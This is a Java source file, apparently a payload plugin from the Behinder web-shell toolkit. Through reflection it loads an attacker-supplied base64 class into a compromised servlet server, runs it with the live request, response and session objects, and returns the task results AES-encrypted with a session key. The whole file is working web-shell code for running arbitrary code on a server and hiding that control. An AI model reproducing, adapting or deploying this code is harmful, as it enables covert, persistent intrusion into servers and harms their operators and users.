package net.rebeyond.behinder.payload.java;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

public class Plugin {
    public static String action;
    public static String payload;
    public static String taskID;
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;

    public boolean equals(Object obj) {
        PageContext page = (PageContext) obj;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        this.Request = page.getRequest();
        page.getResponse().setCharacterEncoding("UTF-8");
        Map<String, String> result = new HashMap<>();
        if (action.equals("submit")) {
            ClassLoader classLoader = getClass().getClassLoader();
            try {
                Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                method.setAccessible(true);
                byte[] payloadData = base64decode(payload);
                Class payloadCls = (Class) method.invoke(classLoader, payloadData, 0, Integer.valueOf(payloadData.length));
                Object payloadObj = payloadCls.newInstance();
                payloadCls.getDeclaredMethod("execute", ServletRequest.class, ServletResponse.class, HttpSession.class).invoke(payloadObj, this.Request, this.Response, this.Session);
                result.put("msg", "任务提交成功");
                result.put("status", "success");
                try {
                    ServletOutputStream so = this.Response.getOutputStream();
                    so.write(Encrypt(buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
                    so.flush();
                    so.close();
                    page.getOut().clear();
                    return true;
                } catch (Exception e) {
                    e.printStackTrace();
                    return true;
                }
            } catch (Exception e2) {
                e2.printStackTrace();
                result.put("msg", e2.getMessage());
                result.put("status", "fail");
                try {
                    ServletOutputStream so2 = this.Response.getOutputStream();
                    so2.write(Encrypt(buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
                    so2.flush();
                    so2.close();
                    page.getOut().clear();
                    return true;
                } catch (Exception e3) {
                    e3.printStackTrace();
                    return true;
                }
            } catch (Throwable th) {
                try {
                    ServletOutputStream so3 = this.Response.getOutputStream();
                    so3.write(Encrypt(buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
                    so3.flush();
                    so3.close();
                    page.getOut().clear();
                } catch (Exception e4) {
                    e4.printStackTrace();
                }
                throw th;
            }
        } else if (!action.equals("getResult")) {
            return true;
        } else {
            try {
                Map<String, String> taskResult = (Map) this.Session.getAttribute(taskID);
                Map<String, String> temp = new HashMap<>();
                temp.put("running", taskResult.get("running"));
                temp.put("result", base64encode(taskResult.get("result")));
                result.put("msg", buildJson(temp, false));
                result.put("status", "success");
                try {
                    ServletOutputStream so4 = this.Response.getOutputStream();
                    so4.write(Encrypt(buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
                    so4.flush();
                    so4.close();
                    page.getOut().clear();
                    return true;
                } catch (Exception e5) {
                    e5.printStackTrace();
                    return true;
                }
            } catch (Exception e6) {
                result.put("msg", e6.getMessage());
                result.put("status", "fail");
                try {
                    ServletOutputStream so5 = this.Response.getOutputStream();
                    so5.write(Encrypt(buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
                    so5.flush();
                    so5.close();
                    page.getOut().clear();
                    return true;
                } catch (Exception e7) {
                    e7.printStackTrace();
                    return true;
                }
            } catch (Throwable th2) {
                try {
                    ServletOutputStream so6 = this.Response.getOutputStream();
                    so6.write(Encrypt(buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
                    so6.flush();
                    so6.close();
                    page.getOut().clear();
                } catch (Exception e8) {
                    e8.printStackTrace();
                }
                throw th2;
            }
        }
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        SecretKeySpec skeySpec = new SecretKeySpec(this.Session.getAttribute("u").toString().getBytes(StandardCharsets.UTF_8), "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        return cipher.doFinal(bs);
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key);
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    getClass();
                    Class Base64 = Class.forName("java.util.Base64");
                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes(StandardCharsets.UTF_8));
                } else {
                    getClass();
                    Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
                    value = ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, value.getBytes(StandardCharsets.UTF_8))).replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }

    private String base64encode(String clearText) throws Exception {
        if (System.getProperty("java.version").compareTo("1.9") >= 0) {
            getClass();
            Class Base64 = Class.forName("java.util.Base64");
            Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
            return (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, clearText.getBytes(StandardCharsets.UTF_8));
        }
        getClass();
        Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
        return ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, clearText.getBytes(StandardCharsets.UTF_8))).replace("\n", "").replace("\r", "");
    }

    private byte[] base64decode(String base64Text) throws Exception {
        if (System.getProperty("java.version").compareTo("1.9") >= 0) {
            getClass();
            Class Base64 = Class.forName("java.util.Base64");
            Object Decoder = Base64.getMethod("getDecoder", null).invoke(Base64, null);
            return (byte[]) Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text);
        }
        getClass();
        Object Decoder2 = Class.forName("sun.misc.BASE64Decoder").newInstance();
        return (byte[]) Decoder2.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder2, base64Text);
    }
}
